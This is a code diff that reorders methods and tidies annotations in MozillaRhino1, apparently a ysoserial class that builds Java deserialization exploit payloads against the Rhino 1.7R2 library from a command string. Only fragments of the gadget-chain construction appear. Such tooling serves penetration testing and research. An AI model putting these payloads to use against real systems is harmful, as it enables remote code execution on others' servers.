@@ -19,10 +19,18 @@ import java.lang.reflect.Method;
     by @matthias_kaiser
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
-@PayloadTest( precondition = "isApplicableJavaVersion")
+@PayloadTest(precondition = "isApplicableJavaVersion")
 @Dependencies({"rhino:js:1.7R2"})
-@Authors({ Authors.MATTHIASKAISER })
+@Authors({Authors.MATTHIASKAISER})
 public class MozillaRhino1 implements ObjectPayload<Object> {
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(MozillaRhino1.class, args);
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
+    }
 
     public Object getObject(final String command) throws Exception {
 
@@ -64,14 +72,6 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
         valField.set(badAttributeValueExpException, idScriptableObject);
 
         return badAttributeValueExpException;
-    }
-
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(MozillaRhino1.class, args);
-    }
-
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isBadAttrValExcReadObj();
     }
 
 }
